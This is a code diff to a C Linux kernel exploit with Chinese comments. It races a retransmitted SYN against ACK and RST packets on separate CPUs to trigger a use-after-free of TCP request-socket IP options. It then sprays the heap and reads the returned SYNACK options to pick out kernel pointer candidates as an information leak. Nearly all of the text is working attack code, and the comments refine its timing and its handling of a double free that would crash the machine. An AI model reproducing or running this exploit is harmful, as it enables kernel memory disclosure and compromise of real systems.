@@ -307,17 +307,25 @@ static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
  * leak 阶段不能用 [complete]：RST 会走 inet_sock_destruct，把子 socket 的
  * inet_opt 再 kfree 一次；如果那时它指向的已经是我们的喷射对象，就是一次
  * double free —— 这台机器 CONFIG_PANIC_ON_OOPS=y，直接重启。 */
-static void complete_ack_only(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
+__attribute__((unused)) static void complete_ack_only(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
     uint8_t pkt[128];
     size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
     tx(pkt, len);
 }
 
-/* 竞态的两半：重传 SYN（走定时器/重传那条读路径）与 ACK（把 ireq_opt 交给
- * 子 socket 并置空）。两边必须落在不同 CPU 上，所以用屏障对齐后各写一次 tun。 */
+/* 竞态的两半，必须落在不同 CPU 上：
+ *
+ *   读侧：重传 SYN → tcp_conn_request → tcp_v4_send_synack，在 RCU 临界区里
+ *         取 req->ireq_opt 并一直用到 ip_options_build 的 memcpy；
+ *   写侧：ACK 完成握手把 ireq_opt 交给子 socket 并置空，紧跟 RST 让子 socket
+ *         走 inet_sock_destruct 把它 kfree 掉。
+ *
+ * 上游修复是把这两处 kfree 改成 kfree_rcu，正是承认“读者在 RCU 里、写者
+ * 直接 kfree”这件事本身不成立 —— 所以只要 kfree 落在读侧 load 之后、memcpy
+ * 之前，就是一次 UAF 读。 */
 struct pair_arg {
-    uint8_t rtx[128], ack[128];
-    size_t rtx_len, ack_len;
+    uint8_t rtx[128], ack[128], rst[128];
+    size_t rtx_len, ack_len, rst_len;
     pthread_barrier_t *bar;
 };
 
@@ -326,6 +334,7 @@ static void *pair_thread(void *p) {
     pthread_barrier_wait(a->bar);
     tx(a->rtx, a->rtx_len);
     tx(a->ack, a->ack_len);
+    tx(a->rst, a->rst_len);
     return NULL;
 }
 
@@ -336,6 +345,7 @@ static void fire_pair(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
     a.bar = &bar;
     a.rtx_len = build_pkt(a.rtx, sport, isn, 0, 0x02);
     a.ack_len = build_pkt(a.ack, sport, isn + 1, peer_seq + 1, 0x10);
+    a.rst_len = build_pkt(a.rst, sport, isn + 1, peer_seq + 1, 0x04);
     pthread_t t1, t2;
     pthread_create(&t1, NULL, pair_thread, &a);
     pthread_create(&t2, NULL, pair_thread, &a);
@@ -435,6 +445,7 @@ static int phase_race(struct hit_ctx *hit) {
             hit->isn = isn;
             hit->s = s;
             found = 1;
+            spray_stop();
             break;
         }
         /* 把同步 ACK 与重传 SYN 对撞：ACK 让 ireq_opt 交给子 socket，
@@ -449,28 +460,29 @@ static int phase_race(struct hit_ctx *hit) {
     return found ? 0 : 1;
 }
 
-/* 泄露：命中后对象已在子 socket 的 inet_opt 里（或被喷淋对象复用）。
- * 只发 ACK 不发 RST，避免 inet_sock_destruct 再 kfree 一次。 */
+/* 泄露：命中的 SYNACK 本身就是回读结果，不需要再发包。
+ *
+ * 这里刻意不发 ACK/RST：那个请求 sock 的 ireq_opt 可能已经指向我们的
+ * 喷射对象，再走一次 inet_sock_destruct 就是 double free，在
+ * PANIC_ON_OOPS=y 的机器上直接重启。 */
 static int phase_leak(struct hit_ctx *hit) {
-    complete_ack_only(hit->sport, hit->isn, hit->s.seq);
+    /* complete_ack_only 保留给以后需要的阶段 */
     say("回读命中对象：");
     dump_opts(&hit->s);
 
+    /* 喷淋在命中时已经停了；这里只做判定，不再动它。 */
     uint64_t cand[8];
     int n = find_text_candidates(&hit->s, cand, 8);
     if (is_spray_tag(&hit->s)) {
         say("对象已被喷淋占据（标记 0x%02x），说明复用成功", SPRAY_TAG0);
-        say("但内容是我们自己写的，没有泄露价值；需要靠残留堆读内核指针");
-        spray_stop();
+        say("但内容是我们自己写的，没有泄露价值；下一轮要靠残留堆读内核指针");
         return 1;
     }
     if (n > 0) {
         for (int i = 0; i < n; i++) say("  内核指针候选[%d] = %#llx", i, (unsigned long long)cand[i]);
-        spray_stop();
         return 0;
     }
     say("没有挑出内核指针候选（optlen=%u）", hit->s.optlen);
-    spray_stop();
     return 1;
 }
 
